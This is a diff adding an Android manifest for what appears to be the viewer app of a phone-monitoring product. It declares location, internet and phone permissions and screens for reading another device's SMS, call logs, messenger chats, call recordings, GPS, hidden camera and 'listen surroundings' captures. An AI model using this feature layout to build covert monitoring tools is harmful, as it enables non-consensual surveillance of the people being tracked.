@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.highstermob.main">
+    <uses-permission android:name="com.highstermob.main.permission.MAPS_RECEIVE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <permission android:name="com.highstermob.main.permission.C2D_MESSAGE" android:protectionLevel="signature"/>
+    <uses-permission android:name="com.highstermob.main.permission.C2D_MESSAGE"/>
+    <instrumentation android:name="android.test.InstrumentationTestRunner" android:targetPackage="com.highstermob.main"/>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:theme="@style/AppTheme">
+        <activity android:label="@string/app_name" android:name="com.highstermob.main.SplashActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:name="com.highstermob.main.LoginActivity" android:screenOrientation="portrait" android:windowSoftInputMode="stateAlwaysHidden|stateAlwaysVisible|adjustResize"/>
+        <activity android:name="com.highstermob.main.DashboardActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.SMSActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.SmsDescriptionActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.CallLogActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.BrwserLogActivity" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="com.pc.customlist.ContactsActivity" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:name="com.highstermob.main.ContactDescriptionActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.WhtsupImageActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.WhtsupVoiceActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.SimInfoActivity" android:screenOrientation="portrait" android:windowSoftInputMode="stateAlwaysHidden|stateAlwaysVisible|adjustResize"/>
+        <activity android:name="com.highstermob.main.MailHistoryActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.MailHistoryDetailActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.WhatUpGroupActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.WhatsupDetailActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.PhotoGridActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.ImagePagerActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.VideoGridActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.HelloInterruptVideoStream" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.ListenSurroundingActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.GPSActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.WebViewActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.WhtsUp_Line_voice_play" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.CallRecordingActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.FacebookActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.FacebookDetailsActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.SkypeLogActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.SkypeDetailsActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.SettingActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.OtherSettingsActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.HiddenCameraActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.ChangePasswordActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.InstagramActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.CommentsListActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.BBMActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.BBM_DetailActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.ViberActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.Viber_DetailActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.ViberMapActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.highstermob.main.FullImageActivity" android:screenOrientation="portrait"/>
+    </application>
+</manifest>
